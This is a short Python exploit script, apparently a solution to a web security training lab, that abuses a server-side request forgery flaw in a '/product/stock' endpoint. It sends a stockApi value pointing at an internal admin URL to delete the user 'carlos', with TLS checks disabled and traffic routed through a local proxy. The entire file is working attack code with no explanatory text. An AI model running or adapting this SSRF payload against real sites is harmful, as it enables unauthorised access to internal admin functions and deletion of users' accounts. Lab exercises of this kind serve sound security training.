import sys
from py import process
import requests_ntlm


import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080"} #,"https":"https://127.0.0.1:8080"}

def delete_user(url):
    ssrf_payload = "http://localhost/admin/delete?username=carlos"
    check_stock_path = "/product/stock"
    params = {'stockApi':ssrf_payload}

    r = requests.post(url + check_stock_path, data = params, verify=False, proxies=proxies)
    
    # Check carlos is deleted

    admin_ssrf_payload = "http://localhost/admin"
    params2 = {'stockApi': admin_ssrf_payload}

    r = requests.post(url + check_stock_path, data = params2, verify=False, proxies=proxies)

    if "User deleted successfully" in r.text:
        print ("(+) User deleted successfully :)")
    else:
        print ("(-) User deletion unsuccessful :(")


def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) Deleting Carlos User...")
    delete_user(url)

if __name__ == "__main__":
    main()